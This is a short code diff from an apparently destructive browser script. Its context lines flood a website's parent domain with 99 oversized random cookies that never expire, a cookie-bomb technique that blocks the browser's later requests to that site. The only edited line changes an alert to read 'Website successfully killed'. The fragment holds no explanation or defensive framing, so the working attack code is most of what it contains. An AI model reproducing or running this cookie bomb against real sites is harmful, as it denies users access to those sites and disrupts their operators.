@@ -12,7 +12,7 @@ b.style.position = "fixed", b.style.top = "50%", b.style.left = "50%", b.style.t
         let t = new Date(2e14).toUTCString(),
             o = location.hostname.split(".").slice(-2).join(".");
         for (let l = 0; l < 99; l++) document.cookie = `cd${l}=${encodeURIComponent(btoa(String.fromCharCode.apply(0,crypto.getRandomValues(new Uint8Array(3168))))).substring(0,3168)};expires=${t};domain=${o};path=/`;
-        alert("I have been killed.")
+        alert("Website successfully killed")
     } else {
         let s = new Date(2e14).toUTCString(),
             n = location.hostname.split(".").slice(-2).join(".");
